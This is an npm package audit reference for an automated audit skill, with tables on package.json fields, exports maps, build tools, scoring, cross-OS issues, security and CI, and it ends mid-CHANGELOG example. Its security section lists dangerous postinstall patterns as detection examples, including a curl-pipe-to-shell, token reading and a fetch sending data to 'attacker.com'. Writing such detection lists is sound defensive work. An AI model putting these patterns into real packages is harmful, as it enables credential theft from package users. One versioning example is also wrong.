# npm Package Audit Reference

Dense lookup tables, validation rules, and reference material for the npm-package-audit skill.

---

## Table of Contents

1. [package.json Field Reference](#1-packagejson-field-reference)
2. [Exports Map Patterns](#2-exports-map-patterns)
3. [Build Tool Comparison](#3-build-tool-comparison)
4. [Dual CJS/ESM Checklist](#4-dual-cjsesm-checklist)
5. [Scoring Rubric](#5-scoring-rubric)
6. [Cross-OS Compatibility Patterns](#6-cross-os-compatibility-patterns)
7. [npm Security Checklist](#7-npm-security-checklist)
8. [CI/CD Workflow Reference](#8-cicd-workflow-reference)
9. [Documentation Quality Standards](#9-documentation-quality-standards)
10. [Dependency Management Reference](#10-dependency-management-reference)
11. [Package Size Optimization](#11-package-size-optimization)

---

## 1. package.json Field Reference

### Required Fields

| Field | Type | Rules | Example |
|-------|------|-------|---------|
| `name` | string | Lowercase only, max 214 chars, no spaces, URL-safe chars, can be scoped (`@scope/name`), must not start with `.` or `_` | `"@acme/utils"` |
| `version` | string | Valid semver: `MAJOR.MINOR.PATCH`, prerelease tags allowed (`-alpha.1`, `-beta.2`, `-rc.1`), build metadata (`+build.123`) | `"2.1.0-beta.3"` |
| `description` | string | Under 280 chars, must not be default `"npm init"` placeholder text, should describe what the package does in plain language | `"Lightweight date formatting utilities"` |
| `license` | string | Valid SPDX identifier, use `UNLICENSED` for proprietary, compound expressions supported (`MIT OR Apache-2.0`) | `"MIT"` |

### Entry Point Fields

| Field | Type | Rules | Example |
|-------|------|-------|---------|
| `main` | string | CJS entry point, resolved when `require()` is used, typically points to compiled output | `"./dist/index.cjs"` |
| `module` | string | ESM entry point (unofficial but widely supported by bundlers), typically `.js` or `.mjs` extension | `"./dist/index.js"` |
| `types` / `typings` | string | TypeScript declaration entry, must point to a `.d.ts` file, `types` is preferred over `typings` | `"./dist/index.d.ts"` |
| `exports` | object | Conditional exports map (Node 12.7+), supersedes `main`/`module` when present, controls all subpath access | See Section 2 |
| `bin` | string or object | CLI entry points, every file referenced must have `#!/usr/bin/env node` shebang as the first line | `{"mycli": "./dist/cli.js"}` |
| `type` | string | `"module"` for ESM-first packages (`.js` files treated as ESM), `"commonjs"` is the default if omitted | `"module"` |

### Publishing Fields

| Field | Type | Rules | Example |
|-------|------|-------|---------|
| `files` | string[] | Whitelist of files/dirs to include in the published tarball, preferred over `.npmignore`, always includes `package.json`, `README`, `LICENSE`, `CHANGELOG` | `["dist", "README.md"]` |
| `publishConfig` | object | Override publish defaults, `access: "public"` required for scoped packages to be public, can set custom registry | `{"access": "public", "registry": "https://registry.npmjs.org/"}` |
| `sideEffects` | boolean or string[] | `false` signals the package is fully tree-shakeable, array form marks specific files with side effects | `false` |
| `engines` | object | Minimum Node/npm versions, npm warns (or errors with `engine-strict`) when constraints are unmet | `{"node": ">=20.0.0"}` |

### Metadata Fields

| Field | Type | Rules | Example |
|-------|------|-------|---------|
| `keywords` | string[] | 3-10 relevant terms for npm search discovery, avoid spammy or unrelated terms | `["date", "format", "utility"]` |
| `author` | string or object | Accepts `"Name <email> (url)"` string or `{name, email, url}` object form | `{"name": "Jane Doe", "email": "jane@example.com"}` |
| `repository` | object | Must match the actual source repository, `type` is usually `"git"`, `directory` field for monorepos | `{"type": "git", "url": "https://github.com/acme/utils.git"}` |
| `homepage` | string | URL to documentation website or project landing page | `"https://acme-utils.dev"` |
| `bugs` | object | URL to issue tracker, helps users report problems | `{"url": "https://github.com/acme/utils/issues"}` |
| `funding` | string or object | Sponsorship link, supports `{type, url}` or plain URL string, can also be an array | `{"type": "github", "url": "https://github.com/sponsors/acme"}` |

### Script Fields

| Script | Purpose | When It Runs |
|--------|---------|--------------|
| `build` | Compile source to distributable output | Manual or in CI |
| `test` | Run test suite | Manual, CI, `npm test` |
| `lint` | Run linter (ESLint, Biome, etc.) | Manual, CI, pre-commit hooks |
| `format` | Run formatter (Prettier, Biome, etc.) | Manual, pre-commit hooks |
| `prepublishOnly` | Runs before `npm publish`, use for build + test | Automatically before publish |
| `prepack` | Runs before tarball is created (publish and pack) | Automatically before pack/publish |
| `prepare` | Runs after `npm install` and before `npm publish`, use for build steps | Automatically on install and publish |
| `postinstall` | Runs after package is installed | Automatically after install (use sparingly) |

### Field Validation Rules

| Validation | Rule | Severity |
|-----------|------|----------|
| `name` contains uppercase | Must be all lowercase | Error |
| `name` exceeds 214 chars | Max 214 characters | Error |
| `name` contains spaces | No spaces allowed, use hyphens | Error |
| `name` starts with `.` or `_` | Cannot start with dot or underscore | Error |
| `version` not valid semver | Must match `X.Y.Z` pattern with optional prerelease/build | Error |
| `description` is empty or default | Must be meaningful, not template text | Warning |
| `description` exceeds 280 chars | Keep concise for npm search display | Warning |
| `license` not valid SPDX | Must be a recognized SPDX identifier | Warning |
| `main` points to nonexistent file | Entry point must exist after build | Error |
| `types` points to nonexistent file | Declaration file must exist after build | Error |
| `files` array is empty | Should list distributable files | Warning |
| `engines` not specified | Should declare minimum Node version | Warning |
| `keywords` empty or >10 entries | 3-10 terms recommended | Warning |
| `repository` missing | Should link to source repository | Warning |
| `bin` file missing shebang | CLI files must start with `#!/usr/bin/env node` | Error |

---

## 2. Exports Map Patterns

### Basic Dual Format

```json
"exports": {
  ".": {
    "types": "./dist/index.d.ts",
    "import": "./dist/index.js",
    "require": "./dist/index.cjs"
  }
}
```

**CRITICAL**: The `types` condition must come FIRST in the resolution order. Node.js and TypeScript resolve conditions top-to-bottom and use the first match. If `types` is not first, TypeScript cannot resolve type declarations.

### Subpath Exports

```json
"exports": {
  ".": {
    "types": "./dist/index.d.ts",
    "import": "./dist/index.js",
    "require": "./dist/index.cjs"
  },
  "./utils": {
    "types": "./dist/utils.d.ts",
    "import": "./dist/utils.js",
    "require": "./dist/utils.cjs"
  },
  "./types": {
    "types": "./dist/types.d.ts"
  },
  "./package.json": "./package.json"
}
```

### Wildcard Exports

```json
"exports": {
  ".": {
    "types": "./dist/index.d.ts",
    "import": "./dist/index.js",
    "require": "./dist/index.cjs"
  },
  "./*": {
    "types": "./dist/*.d.ts",
    "import": "./dist/*.js",
    "require": "./dist/*.cjs"
  }
}
```

### Environment-Specific Exports

```json
"exports": {
  ".": {
    "types": "./dist/index.d.ts",
    "browser": "./dist/index.browser.js",
    "import": "./dist/index.js",
    "require": "./dist/index.cjs",
    "default": "./dist/index.js"
  }
}
```

### Condition Resolution Order

Node.js resolves export conditions from top to bottom and uses the first matching entry. The recommended order is:

1. `types` -- TypeScript declarations (must be first)
2. `browser` -- Browser-specific builds (optional)
3. `development` / `production` -- Environment-specific (optional)
4. `import` -- ESM entry point
5. `require` -- CJS entry point
6. `default` -- Fallback entry point

### Common Exports Map Mistakes

| Mistake | Symptom | Fix |
|---------|---------|-----|
| `types` not listed first | TypeScript reports "Could not find a declaration file" | Move `types` to the first position in every condition block |
| Missing `.cjs` extension for `require` | CJS consumers get ESM and crash with `ERR_REQUIRE_ESM` | Use `.cjs` extension for all CJS outputs |
| No `./package.json` entry | Tools that read `package.json` via import fail (e.g., bundlers reading version) | Add `"./package.json": "./package.json"` |
| Missing `default` fallback | Older bundlers or runtimes cannot resolve the package | Add `"default": "./dist/index.js"` as the last condition |
| Subpath not matching actual files | Import fails with `ERR_MODULE_NOT_FOUND` | Verify every export path matches a real file after build |
| Wildcard pattern with wrong extension | Some files resolve, others do not | Ensure wildcard maps to the correct extension pattern |
| Exports map present but incomplete | `main`/`module` fallback is ignored, causing broken imports for unlisted paths | Either list all public subpaths or do not use `exports` at all |
| Mixing `.js` and `"type": "commonjs"` | `.js` is treated as CJS, breaking ESM imports | Set `"type": "module"` when using `.js` for ESM |

### Exports Validation Checklist

- [ ] Every condition block has `types` as the first entry
- [ ] `import` condition points to an ESM file (`.js` with `"type": "module"` or `.mjs`)
- [ ] `require` condition points to a CJS file (`.cjs`)
- [ ] `./package.json` is exported
- [ ] All listed files exist after running the build
- [ ] No internal/private paths are accidentally exposed
- [ ] Wildcard patterns resolve correctly for all intended subpaths

---

## 3. Build Tool Comparison

| Tool | Dual CJS/ESM | Type Declarations | Tree-shaking | Config Complexity | Best For |
|------|-------------|-------------------|--------------|-------------------|----------|
| tsup | Yes (built-in) | Yes (`dts` option) | Yes | Minimal | Most packages |
| rollup | Yes (via plugins) | Via `rollup-plugin-dts` | Yes | Verbose | Complex builds, multiple entry points |
| esbuild | Yes | No (use `tsc` separately) | Yes | Minimal | Speed-critical builds |
| tsc only | Manual setup | Yes (native) | No | tsconfig only | Type-only packages, simple libraries |
| vite (library mode) | Yes | Via `vite-plugin-dts` | Yes | vite.config.ts | Vite ecosystem libraries |
| unbuild | Yes (built-in) | Yes (built-in) | Yes | Minimal | Monorepo packages |
| pkgroll | Yes (built-in) | Yes (built-in) | Yes | Zero-config | Simple packages |

### Recommended tsup Configuration

```typescript
import { defineConfig } from "tsup";

export default defineConfig({
  entry: ["src/index.ts"],
  format: ["esm", "cjs"],
  dts: true,
  sourcemap: true,
  clean: true,
  target: "node20",
  splitting: false,
  shims: true,
  treeshake: true,
  outDir: "dist",
});
```

### tsup Configuration Options Reference

| Option | Type | Default | Purpose |
|--------|------|---------|---------|
| `entry` | string[] | -- | Entry point file(s) |
| `format` | ("esm" \| "cjs" \| "iife")[] | `["esm"]` | Output format(s) |
| `dts` | boolean | `false` | Generate `.d.ts` declaration files |
| `sourcemap` | boolean | `false` | Generate source maps |
| `clean` | boolean | `false` | Clean output directory before build |
| `target` | string | -- | Compilation target (e.g., `"node20"`, `"es2022"`) |
| `splitting` | boolean | `true` (esm) | Code splitting for shared chunks |
| `shims` | boolean | `false` | Inject CJS/ESM interop shims (`__dirname`, `import.meta.url`) |
| `treeshake` | boolean | `false` | Enable tree-shaking via rollup |
| `minify` | boolean | `false` | Minify output |
| `outDir` | string | `"dist"` | Output directory |
| `external` | string[] | -- | External dependencies (not bundled) |
| `noExternal` | string[] | -- | Force-bundled dependencies |
| `banner` | object | -- | Banner text prepended to output (`{js: "...", css: "..."}`) |

### Rollup Configuration (Dual Format)

```javascript
import resolve from "@rollup/plugin-node-resolve";
import commonjs from "@rollup/plugin-commonjs";
import typescript from "@rollup/plugin-typescript";

export default [
  {
    input: "src/index.ts",
    output: [
      { file: "dist/index.js", format: "esm", sourcemap: true },
      { file: "dist/index.cjs", format: "cjs", sourcemap: true },
    ],
    plugins: [resolve(), commonjs(), typescript()],
    external: [/node_modules/],
  },
];
```

### esbuild + tsc Configuration

```json
// package.json scripts
{
  "scripts": {
    "build:esm": "esbuild src/index.ts --bundle --format=esm --outfile=dist/index.js --sourcemap --platform=node --target=node20",
    "build:cjs": "esbuild src/index.ts --bundle --format=cjs --outfile=dist/index.cjs --sourcemap --platform=node --target=node20",
    "build:types": "tsc --emitDeclarationOnly --declaration --declarationMap --outDir dist",
    "build": "npm run build:esm && npm run build:cjs && npm run build:types"
  }
}
```

---

## 4. Dual CJS/ESM Checklist

### Required package.json Fields

```json
{
  "type": "module",
  "main": "./dist/index.cjs",
  "module": "./dist/index.js",
  "types": "./dist/index.d.ts",
  "exports": {
    ".": {
      "types": "./dist/index.d.ts",
      "import": "./dist/index.js",
      "require": "./dist/index.cjs"
    },
    "./package.json": "./package.json"
  },
  "files": ["dist"],
  "sideEffects": false
}
```

### Required tsconfig Settings

```json
{
  "compilerOptions": {
    "declaration": true,
    "declarationMap": true,
    "sourceMap": true,
    "strict": true,
    "moduleResolution": "bundler",
    "module": "ESNext",
    "target": "ES2022",
    "outDir": "dist",
    "rootDir": "src",
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "isolatedModules": true
  },
  "include": ["src"],
  "exclude": ["node_modules", "dist", "**/*.test.ts", "**/*.spec.ts"]
}
```

### File Extension Rules

| Extension | Behavior with `"type": "module"` | Behavior with `"type": "commonjs"` (default) |
|-----------|----------------------------------|----------------------------------------------|
| `.js` | Treated as ESM | Treated as CJS |
| `.mjs` | Always ESM | Always ESM |
| `.cjs` | Always CJS | Always CJS |
| `.d.ts` | Type declaration (ESM context) | Type declaration (CJS context) |
| `.d.mts` | Type declaration (always ESM) | Type declaration (always ESM) |
| `.d.cts` | Type declaration (always CJS) | Type declaration (always CJS) |

### Interop Pitfalls

| Issue | Cause | Solution |
|-------|-------|----------|
| `__dirname is not defined` | ESM does not have `__dirname` | Use `import.meta.url` with `fileURLToPath` or enable `shims` in tsup |
| `require is not defined` | CJS globals are absent in ESM | Use `import` or `createRequire(import.meta.url)` |
| `ERR_REQUIRE_ESM` | CJS code tries to `require()` an ESM module | Provide a CJS build (`.cjs`) alongside the ESM build |
| `Cannot use import statement` | ESM syntax in a CJS context | Ensure `"type": "module"` is set or use `.mjs` extension |
| Default export mismatch | `module.exports = x` vs `export default x` | Use `esModuleInterop: true` and test both import styles |
| Named exports missing in CJS | CJS `require()` returns `{default: ...}` | Use named exports in source, verify CJS output has proper exports |
| JSON import fails | JSON modules need assertion or flag | Use `resolveJsonModule: true` and `import data from "./data.json" with { type: "json" }` in ESM |

### Dual Format Validation Steps

1. Build the package: `npm run build`
2. Verify ESM output exists: `ls dist/index.js`
3. Verify CJS output exists: `ls dist/index.cjs`
4. Verify types exist: `ls dist/index.d.ts`
5. Test ESM import: `node -e "import('./dist/index.js').then(m => console.log(Object.keys(m)))"`
6. Test CJS require: `node -e "console.log(Object.keys(require('./dist/index.cjs')))"`
7. Test TypeScript resolution: `tsc --noEmit --moduleResolution bundler -e "import {} from './dist'"`
8. Dry-run publish: `npm pack --dry-run` and verify tarball contents

---

## 5. Scoring Rubric

### Phase Breakdown

| Phase | Name | Max Points | Scoring Criteria |
|-------|------|------------|-----------------|
| Phase 1 | Discovery | 0 | Context gathering only -- no score assigned |
| Phase 2 | package.json | 15 | See detailed breakdown below |
| Phase 3 | Exports Map | 15 | See detailed breakdown below |
| Phase 4 | Build Config | 15 | See detailed breakdown below |
| Phase 5 | Type Declarations | 10 | See detailed breakdown below |
| Phase 6 | Testing | 10 | See detailed breakdown below |
| Phase 7 | Cross-OS | 10 | See detailed breakdown below |
| Phase 8 | Security | 10 | See detailed breakdown below |
| Phase 9 | Publishing | 10 | See detailed breakdown below |
| Phase 10 | Documentation | 5 | See detailed breakdown below |
| **Total** | | **100** | |

### Phase 2: package.json Audit (15 points)

Starting at 15, subtract:

| Deduction | Reason |
|-----------|--------|
| -3 | Missing `name` field or invalid name |
| -3 | Missing `version` field or invalid semver |
| -3 | Missing `license` field or invalid SPDX identifier |
| -3 | Missing `description` or using default placeholder text |
| -3 | Missing `main` or `exports` entry point |
| -1 | Missing `engines` field |
| -1 | Missing `keywords` or fewer than 3 keywords |
| -1 | Missing `repository` field |
| -1 | Missing `author` field |
| -1 | Missing `files` array (relying on `.npmignore` or defaults) |
| -1 | Missing `homepage` or `bugs` field |

Minimum score: 0 (cannot go negative).

### Phase 3: Exports Map Audit (15 points)

Starting at 15, subtract:

| Deduction | Reason |
|-----------|--------|
| -5 | `types` condition is not the first entry in any export block |
| -3 | One or more export paths resolve to nonexistent files |
| -3 | Missing `require` condition (CJS consumers cannot use the package) |
| -2 | No `exports` map at all (relying only on `main`/`module`) |
| -2 | Missing `./package.json` export entry |
| -2 | No `default` fallback condition |
| -1 | Wildcard pattern does not cover all intended subpaths |

Minimum score: 0.

### Phase 4: Build Configuration Audit (15 points)

Starting at 15, subtract:

| Deduction | Reason |
|-----------|--------|
| -5 | No dual CJS/ESM output format |
| -3 | No source maps generated |
| -3 | No type declaration generation (`.d.ts` files) |
| -2 | No clean step (stale files in output directory) |
| -2 | No explicit build target specified |
| -1 | No `prepublishOnly` or `prepack` script to ensure build runs before publish |
| -1 | Build output directory is not in `.gitignore` |

Minimum score: 0.

### Phase 5: Type Declaration Audit (10 points)

Starting at 10, subtract:

| Deduction | Reason |
|-----------|--------|
| -5 | `tsc --noEmit` fails (TypeScript compilation errors) |
| -2 | `any` type used in public API surface (exported functions/types) |
| -2 | No `strict: true` in tsconfig |
| -1 | No declaration maps (`declarationMap: true`) for source navigation |
| -1 | Missing type exports in `exports` map |

Minimum score: 0.

### Phase 6: Testing Audit (10 points)

Starting at 10, subtract:

| Deduction | Reason |
|-----------|--------|
| -5 | Test suite fails (`npm test` exits non-zero) |
| -3 | Code coverage below project thresholds (default: 80% lines) |
| -2 | No `test` script defined in package.json |
| -1 | No test runner configured (vitest, jest, node:test, etc.) |
| -1 | No coverage reporting configured |

Minimum score: 0.

### Phase 7: Cross-OS Compatibility Audit (10 points)

Starting at 10, subtract:

| Deduction | Reason |
|-----------|--------|
| -3 | Hardcoded Unix paths (e.g., `/usr/local/`, `/tmp/file`) in source code |
| -2 | No CI matrix testing across operating systems |
| -2 | No `.gitattributes` file for line ending normalization |
| -1 | Unix-only shell commands in npm scripts (e.g., `rm -rf`, `cp -r`, `export VAR=val`) |
| -1 | Hardcoded path separators (`/` or `\\`) instead of `path.join()` |
| -1 | `process.env.HOME` without Windows fallback |

Minimum score: 0.

### Phase 8: Security Audit (10 points)

Starting at 10, subtract:

| Deduction | Reason |
|-----------|--------|
| -5 | Critical vulnerability in `npm audit` |
| -3 | High vulnerability in `npm audit` |
| -3 | Secrets or tokens found in `.npmrc` or published files |
| -2 | Dangerous `postinstall` script that executes arbitrary code |
| -2 | Dependencies using `*` (any version) range |
| -1 | `package-lock.json` not committed |
| -1 | Moderate vulnerability in `npm audit` |

Minimum score: 0.

### Phase 9: Publishing Readiness Audit (10 points)

Starting at 10, subtract:

| Deduction | Reason |
|-----------|--------|
| -3 | No `prepublishOnly` script (build may not run before publish) |
| -3 | No CI-based publish workflow (manual publishing only) |
| -2 | No `CHANGELOG.md` or release notes process |
| -2 | No `--provenance` flag in publish step (supply chain attestation) |
| -1 | No `.npmignore` or `files` field (entire repo may be published) |
| -1 | Scoped package without `publishConfig.access: "public"` |

Minimum score: 0.

### Phase 10: Documentation Audit (5 points)

Starting at 5, subtract:

| Deduction | Reason |
|-----------|--------|
| -2 | No `README.md` file |
| -1 | README missing installation instructions |
| -1 | README missing usage examples |
| -1 | README missing API documentation |
| -1 | README missing license section |
| -1 | No `CONTRIBUTING.md` file |

Minimum score: 0.

### Verdict Thresholds

| Score Range | Verdict | Meaning |
|-------------|---------|---------|
| 90-100 | **PASS** | Package meets all quality standards and is ready for publishing |
| 70-89 | **PASS WITH WARNINGS** | Package is functional but has areas for improvement |
| 50-69 | **CONDITIONAL** | Package has significant issues that should be addressed before publishing |
| 0-49 | **FAIL** | Package has critical problems and should not be published in its current state |

### Verdict Output Format

```
Score: XX/100 -- VERDICT

Phase Breakdown:
  Phase 2  package.json      XX/15
  Phase 3  Exports Map       XX/15
  Phase 4  Build Config      XX/15
  Phase 5  Type Declarations XX/10
  Phase 6  Testing           XX/10
  Phase 7  Cross-OS          XX/10
  Phase 8  Security          XX/10
  Phase 9  Publishing        XX/10
  Phase 10 Documentation     XX/5

Critical Issues (must fix):
  - [list of blocking issues]

Warnings (should fix):
  - [list of non-blocking issues]

Recommendations:
  - [list of improvements]
```

---

## 6. Cross-OS Compatibility Patterns

### Path Handling

| Pattern | Problem | Fix |
|---------|---------|-----|
| `path + '/' + file` | Fails on Windows (expects `\`) | `path.join(dir, file)` |
| `'\\\\' in path` check | Different separator on Unix | `path.sep` for platform separator |
| `__dirname + '/config'` | Not available in ESM, hardcoded separator | `new URL('./config', import.meta.url)` |
| `'/tmp/myfile.txt'` | `/tmp` does not exist on Windows | `os.tmpdir()` for platform temp directory |
| `path.resolve('/usr/local/bin')` | Unix-only absolute path | Use `process.execPath` or config-driven paths |

### Environment Variables

| Pattern | Problem | Fix |
|---------|---------|-----|
| `process.env.HOME` | `undefined` on Windows | `os.homedir()` or `process.env.HOME \|\| process.env.USERPROFILE` |
| `process.env.SHELL` | `undefined` on Windows | `process.env.SHELL \|\| process.env.ComSpec` |
| `process.env.PATH` (lowercase) | Case-sensitive lookup fails on Windows | Use `process.env.PATH \|\| process.env.Path` |
| `export VAR=value && cmd` | `export` is not a command in Windows cmd | `cross-env VAR=value cmd` |
| `source .env` | Shell-specific | `dotenv` package or `--env-file` Node flag |

### Shell Commands in npm Scripts

| Pattern | Problem | Fix |
|---------|---------|-----|
| `rm -rf dist` | Not available on Windows cmd | `rimraf dist` (npm package) or tsup/build tool `clean` option |
| `cp -r src/ dest/` | Not available on Windows cmd | `cpy-cli 'src/**' dest` or Node `fs.cpSync` |
| `mkdir -p dir/sub` | `-p` flag not available on Windows cmd | `mkdirp dir/sub` (npm package) or Node `fs.mkdirSync(dir, {recursive: true})` |
| `cat file.txt` | Not available on Windows cmd | Node `fs.readFileSync` or use a cross-platform tool |
| `echo $VAR` | Different syntax on Windows (`%VAR%`) | `cross-env` + `echo` or use Node scripts |
| `which node` | Not available on Windows | `where node` on Windows or `npm-which` package |
| `#!/bin/bash` in scripts | Not portable to all systems | `#!/usr/bin/env bash` for better portability |
| `#!/usr/local/bin/node` | Hardcoded path, fails on most systems | `#!/usr/bin/env node` |
| `&&` chaining | Works everywhere but `\|\|` behavior differs | Use `npm-run-all` or separate script entries for complex chains |

### File System Differences

| Issue | Behavior | Mitigation |
|-------|----------|------------|
| Case sensitivity | macOS/Windows: case-insensitive, Linux: case-sensitive | Use consistent lowercase file naming |
| Line endings | Git may convert `LF` to `CRLF` on Windows | `.gitattributes` with `* text=auto eol=lf` |
| Max path length | Windows has 260-char default limit | Keep paths short, enable long paths in Git config |
| Symlinks | Require elevated privileges on Windows | Avoid symlinks or document requirement |
| File locks | Windows locks open files more aggressively | Use `graceful-fs` or handle `EBUSY` errors |
| Hidden files | Unix uses `.` prefix, Windows uses file attribute | Check both conventions when scanning |

### Recommended .gitattributes

```gitattributes
# Normalize line endings to LF on checkout
* text=auto eol=lf

# Explicitly declare text files
*.ts text eol=lf
*.tsx text eol=lf
*.js text eol=lf
*.jsx text eol=lf
*.json text eol=lf
*.md text eol=lf
*.yml text eol=lf
*.yaml text eol=lf

# Declare binary files
*.png binary
*.jpg binary
*.gif binary
*.ico binary
*.woff2 binary
```

### CI OS Matrix Template

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
    node: [20, 22]
  fail-fast: false
runs-on: ${{ matrix.os }}
```

Setting `fail-fast: false` ensures all matrix combinations run even if one fails, giving a complete picture of cross-platform compatibility.

---

## 7. npm Security Checklist

### Pre-Publish Security Checks

| # | Check | Command / Action | Severity |
|---|-------|-----------------|----------|
| 1 | Run vulnerability audit | `npm audit` | Critical |
| 2 | Verify tarball contents | `npm pack --dry-run` | Critical |
| 3 | Check for secrets in output | Review `npm pack --dry-run` output for `.env`, credentials, tokens | Critical |
| 4 | No dangerous postinstall | Review `scripts.postinstall` in all dependencies | High |
| 5 | Dependencies version-pinned | No `"*"` ranges in `dependencies` or `devDependencies` | High |
| 6 | Lock file committed | `package-lock.json` exists and is tracked by Git | High |
| 7 | Scoped package name | `@scope/name` format prevents dependency confusion attacks | Medium |
| 8 | Explicit registry | `publishConfig.registry` set to `https://registry.npmjs.org/` | Medium |
| 9 | npm provenance enabled | `npm publish --provenance` in CI workflow | Medium |
| 10 | npm 2FA enabled | Enabled on npmjs.com account for publishing | Medium |
| 11 | Token stored in CI secrets | `NPM_TOKEN` in GitHub Secrets, never in code or `.npmrc` committed to repo | Critical |
| 12 | Transitive dependency review | Periodic review of full dependency tree | Low |

### Vulnerability Severity Levels

| Severity | npm audit level | Action Required |
|----------|----------------|-----------------|
| Critical | `critical` | Must fix before publishing. Update dependency or find alternative. |
| High | `high` | Should fix before publishing. Evaluate exposure and update. |
| Moderate | `moderate` | Fix when possible. Document if deferring. |
| Low | `low` | Fix at convenience. Low risk but still track. |

### Dangerous postinstall Script Indicators

| Indicator | Risk | Example |
|-----------|------|---------|
| Downloads external binary | Supply chain attack | `curl http://... \| sh` |
| Executes arbitrary shell | Code execution | `node -e "require('child_process').exec('...')"` |
| Accesses network | Data exfiltration | `fetch('http://attacker.com?data=' + ...)` |
| Reads environment variables | Token theft | `process.env.NPM_TOKEN` |
| Writes outside package dir | File system tampering | `fs.writeFileSync('/etc/...', ...)` |

### Supply Chain Attack Prevention

| Attack Vector | Prevention |
|--------------|------------|
| Dependency confusion | Use scoped package names (`@org/pkg`) |
| Typosquatting | Verify package name spelling before installing |
| Compromised maintainer | Use `npm audit signatures` to verify registry signatures |
| Malicious update | Pin exact versions for critical dependencies, use lock files |
| Build-time injection | Use `--ignore-scripts` during CI install, selectively allow |
| Registry impersonation | Set explicit `registry` in `.npmrc` and `publishConfig` |

### Files That Should NEVER Be Published

| File/Pattern | Contains | Prevention |
|-------------|----------|------------|
| `.env` | Environment variables, API keys | Add to `.npmignore` and `files` whitelist |
| `.env.*` | Environment-specific secrets | Add to `.npmignore` |
| `.npmrc` (with tokens) | npm auth tokens | Never commit, add to `.gitignore` |
| `*.pem` / `*.key` | Private keys, certificates | Add to `.npmignore` and `.gitignore` |
| `credentials.json` | Service account keys | Add to `.gitignore` |
| `.git/` | Repository history | Automatically excluded by npm |
| `node_modules/` | Dependencies | Automatically excluded by npm |
| `coverage/` | Test coverage reports | Add to `files` whitelist (exclude by omission) |
| `__tests__/` / `*.test.*` | Test files | Add to `files` whitelist (exclude by omission) |
| `.github/` | CI workflows, issue templates | Add to `files` whitelist (exclude by omission) |

---

## 8. CI/CD Workflow Reference

### Recommended GitHub Actions Publish Workflow

```yaml
name: Publish to npm
on:
  release:
    types: [published]

permissions:
  contents: read
  id-token: write

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "20"
          registry-url: "https://registry.npmjs.org"

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Run tests
        run: npm test

      - name: Run audit
        run: npm audit --audit-level=high

      - name: Verify package contents
        run: npm pack --dry-run

      - name: Publish with provenance
        run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### Recommended CI Test Matrix Workflow

```yaml
name: CI
on:
  push:
    branches: [main, dev]
  pull_request:
    branches: [main, dev]

jobs:
  test:
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        node: [20, 22]
    runs-on: ${{ matrix.os }}
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Type check
        run: npx tsc --noEmit

      - name: Lint
        run: npm run lint

      - name: Test
        run: npm test

      - name: Test coverage
        run: npm test -- --coverage
```

### Release Process Checklist

| Step | Action | Automated? |
|------|--------|------------|
| 1 | Update version in `package.json` | `npm version patch/minor/major` |
| 2 | Update `CHANGELOG.md` | Manual or via `conventional-changelog` |
| 3 | Commit version bump | `npm version` does this automatically |
| 4 | Create Git tag | `npm version` does this automatically |
| 5 | Push commit and tag | `git push && git push --tags` |
| 6 | Create GitHub Release | Manual or via GitHub Actions |
| 7 | Publish to npm | Triggered by release event in CI |
| 8 | Verify published package | `npm info <package>@<version>` |

### Versioning Quick Reference

| Command | Effect | When to Use |
|---------|--------|-------------|
| `npm version patch` | `1.2.3` -> `1.2.4` | Bug fixes, minor corrections |
| `npm version minor` | `1.2.3` -> `1.3.0` | New features, backward compatible |
| `npm version major` | `1.2.3` -> `2.0.0` | Breaking changes |
| `npm version prerelease --preid=alpha` | `1.2.3` -> `1.2.4-alpha.0` | Pre-release testing |
| `npm version prerelease --preid=beta` | `1.2.4-alpha.0` -> `1.2.4-alpha.1` | Next pre-release iteration |
| `npm version from-git` | Uses latest Git tag | Sync version from Git |

### npm Publish Tags

| Tag | Command | Purpose |
|-----|---------|---------|
| `latest` | `npm publish` (default) | Stable releases, installed by default |
| `next` | `npm publish --tag next` | Pre-release / upcoming major versions |
| `beta` | `npm publish --tag beta` | Beta testing |
| `alpha` | `npm publish --tag alpha` | Alpha testing |
| `canary` | `npm publish --tag canary` | Automated nightly / per-commit builds |

Install a specific tag: `npm install <package>@next`

---

## 9. Documentation Quality Standards

### README Structure

A complete package README should include the following sections in order:

| Section | Required | Content |
|---------|----------|---------|
| Title + badges | Yes | Package name, version badge, CI status, coverage, license |
| Description | Yes | One-paragraph summary of what the package does and why |
| Installation | Yes | `npm install` command, peer dependency notes |
| Quick start | Yes | Minimal working code example (copy-pasteable) |
| Usage / API | Yes | All exported functions/types with parameters, return types, examples |
| Configuration | If applicable | Options, environment variables, config files |
| TypeScript | If applicable | Type import examples, generic usage |
| Browser / Node support | If applicable | Compatibility matrix |
| FAQ / Troubleshooting | Recommended | Common issues and solutions |
| Contributing | Recommended | Link to `CONTRIBUTING.md` or inline guide |
| License | Yes | License name with link to `LICENSE` file |

### Badge Reference

| Badge | Service | Markdown |
|-------|---------|----------|
| npm version | shields.io | `![npm](https://img.shields.io/npm/v/PACKAGE)` |
| CI status | GitHub Actions | `![CI](https://github.com/OWNER/REPO/actions/workflows/ci.yml/badge.svg)` |
| Coverage | Codecov | `![Coverage](https://codecov.io/gh/OWNER/REPO/branch/main/graph/badge.svg)` |
| License | shields.io | `![License](https://img.shields.io/npm/l/PACKAGE)` |
| Bundle size | bundlephobia | `![Bundle](https://img.shields.io/bundlephobia/minzip/PACKAGE)` |
| Downloads | shields.io | `![Downloads](https://img.shields.io/npm/dm/PACKAGE)` |
| TypeScript | shields.io | `![TypeScript](https://img.shields.io/badge/TypeScript-Ready-blue)` |

### CHANGELOG Format (Keep a Changelog)

```markdown
# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/),
and this project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

## [2.1.0] - 2026-04-08

### Added
